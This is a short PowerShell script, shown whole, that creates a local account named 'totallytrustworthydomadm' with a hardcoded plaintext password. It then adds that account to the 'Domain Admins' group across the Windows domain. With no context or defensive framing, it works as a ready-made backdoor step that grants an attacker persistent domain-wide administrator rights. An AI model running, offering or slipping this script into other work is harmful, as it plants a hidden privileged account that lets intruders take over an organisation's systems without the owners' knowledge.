Param(
    [Parameter(Mandatory=$False)]
    [string]$User = "totallytrustworthydomadm",

    [Parameter(Mandatory=$False)]
    [Security.SecureString]$Password = ("2025newD0mAdm!!" | ConvertTo-SecureString -AsPlainText -Force)
)

New-LocalUser $User -Password $Password
net group "Domain Admins" $User /ADD /DOMAIN
